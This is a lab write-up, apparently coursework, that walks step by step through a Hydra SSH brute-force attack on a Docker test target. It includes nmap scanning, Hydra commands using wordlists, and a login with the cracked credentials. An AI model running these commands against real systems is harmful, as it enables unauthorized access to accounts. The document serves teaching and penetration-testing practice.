# SSH Brute Force Attack Documentation

## 1) Tool Name
**Hydra** (THC-Hydra)

A fast and flexible network login cracker that supports numerous protocols including SSH, FTP, HTTP, and more. It is pre-installed in Kali Linux and used for password brute-forcing attacks.

---

## 2) Attack Name
**SSH Brute Force Attack**

A brute force attack against SSH (Secure Shell) service that systematically attempts multiple username and password combinations to gain unauthorized access to a remote system.

---

## 3) Procedure / Steps

### Step 1: Start the Testing Environment
Start the Docker containers for the attack simulation:
```bash
docker-compose up -d --build
```



**Screenshot Placeholder:**
```
[Screenshot 1: Docker containers starting]
```

---

### Step 2: Access the Kali Linux Container
Enter the Kali attacker container:
```bash
docker exec -it kali-attacker /bin/bash
```

**Screenshot Placeholder:**
```
[Screenshot 2: Inside Kali container terminal]
```

---

### Step 3: Verify Network Connectivity
Test connectivity to the SSH target:
```bash
ping -c 4 ssh-target
```

**Screenshot Placeholder:**
```
[Screenshot 3: Ping results showing successful connectivity]
```

---

### Step 4: Perform Port Scanning
Scan the target to confirm SSH service is running:
```bash
nmap -sV -p 22 ssh-target
```

**Screenshot Placeholder:**
```
[Screenshot 4: Nmap scan results showing port 22 open]
```

---

### Step 5: Prepare Wordlists
Verify the wordlists are available:
```bash
ls -la /root/wordlists/
cat /root/wordlists/users.txt
cat /root/wordlists/passwords.txt
```

**Screenshot Placeholder:**
```
[Screenshot 5: Contents of wordlist files]
```

---

### Step 6: Execute Brute Force Attack (Single User)
Attempt to crack password for a single user:
```bash
hydra -l admin -P /root/wordlists/passwords.txt ssh://ssh-target -v
```

**Screenshot Placeholder:**
```
[Screenshot 6: Hydra attack in progress with verbose output]
```

---

### Step 7: Execute Brute Force Attack (Multiple Users)
Attack with both username and password lists:
```bash
hydra -L /root/wordlists/users.txt -P /root/wordlists/passwords.txt ssh://ssh-target -t 4 -v
```

**Screenshot Placeholder:**
```
[Screenshot 7: Multiple credential attempts showing found passwords]
```

---

### Step 8: Review Attack Results
Check the discovered credentials:
```bash
# Results are displayed in the terminal output
# Look for lines showing "[22][ssh] host: ssh-target login: admin password: admin123"
```

**Screenshot Placeholder:**
```
[Screenshot 8: Successful credential discovery summary]
```

---

### Step 9: Verify Access with Discovered Credentials
Test the discovered credentials:
```bash
ssh admin@ssh-target
```
Enter the password when prompted: `admin123`

**Screenshot Placeholder:**
```
[Screenshot 9: Successful SSH login]
```

---

### Step 10: Monitor Target Logs
View authentication attempts on the target system:
```bash
docker exec ssh-target tail -n 50 /var/log/auth.log
```

**Screenshot Placeholder:**
```
[Screenshot 10: Auth logs showing multiple failed attempts and successful login]
```

---

## 4) Command Reference

| Command | Purpose |
|---------|---------|
| `hydra -l <user> -P <passfile> ssh://<target>` | Single user brute force |
| `hydra -L <userfile> -P <passfile> ssh://<target>` | Multiple users brute force |
| `hydra -t 4` | Set 4 parallel tasks |
| `hydra -v` | Verbose output |
| `hydra -f` | Stop after first found credential |
| `hydra -o results.txt` | Save results to file |

---

## Notes
- This attack is for **educational purposes only** in a controlled environment
- Always have written authorization before testing any system
- Modern SSH servers implement rate limiting and account lockout to prevent such attacks
- Strong passwords and key-based authentication effectively defend against brute force attacks

---

**Environment Details:**
- Attacker: Kali Linux (172.20.0.2)
- Target: Ubuntu SSH Server (172.20.0.3)
- Network: pentest-network (172.20.0.0/24)
- Tool Version: Hydra THC 9.x
